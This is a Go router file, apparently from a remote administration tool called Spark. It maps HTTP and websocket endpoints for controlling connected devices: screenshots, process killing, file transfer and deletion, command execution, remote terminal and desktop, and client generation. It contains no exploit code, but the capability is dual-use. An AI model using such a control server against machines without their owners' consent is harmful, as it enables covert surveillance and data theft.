package handler

import (
	"Spark/handler/api"
	"Spark/handler/bridge"
	"Spark/handler/desktop"
	"Spark/handler/file"
	"Spark/handler/generate"
	"Spark/handler/process"
	"Spark/handler/screenshot"
	"Spark/handler/terminal"
	"Spark/handler/utility"
	"github.com/gin-gonic/gin"
)

var AuthHandler gin.HandlerFunc

// InitRouter will initialize http and websocket routers.
func InitRouter(ctx *gin.RouterGroup) {
	// Public API endpoints (no authentication required)
	ctx.GET(`/info`, api.Info)
	ctx.GET(`/health`, api.HealthCheck)
	ctx.GET(`/metrics`, api.Metrics)
	ctx.GET(`/status`, api.Status)
	ctx.GET(`/version`, api.Version)
	ctx.GET(`/ping`, api.Ping)
	
	// Bridge endpoints
	ctx.Any(`/bridge/push`, bridge.BridgePush)
	ctx.Any(`/bridge/pull`, bridge.BridgePull)
	ctx.Any(`/client/update`, utility.CheckUpdate) // Client, for update.
	
	// Protected API endpoints (authentication required)
	group := ctx.Group(`/`, AuthHandler)
	{
		// Device management endpoints
		group.POST(`/device/screenshot/get`, screenshot.GetScreenshot)
		group.POST(`/device/process/list`, process.ListDeviceProcesses)
		group.POST(`/device/process/kill`, process.KillDeviceProcess)
		group.POST(`/device/file/remove`, file.RemoveDeviceFiles)
		group.POST(`/device/file/upload`, file.UploadToDevice)
		group.POST(`/device/file/list`, file.ListDeviceFiles)
		group.POST(`/device/file/text`, file.GetDeviceTextFile)
		group.POST(`/device/file/get`, file.GetDeviceFiles)
		group.POST(`/device/exec`, utility.ExecDeviceCmd)
		group.POST(`/device/list`, utility.GetDevices)
		group.POST(`/device/:act`, utility.CallDevice)
		
		// Client management endpoints
		group.POST(`/client/check`, generate.CheckClient)
		group.POST(`/client/generate`, generate.GenerateClient)
		
		// Real-time communication endpoints
		group.Any(`/device/terminal`, terminal.InitTerminal)
		group.Any(`/device/desktop`, desktop.InitDesktop)
	}
}
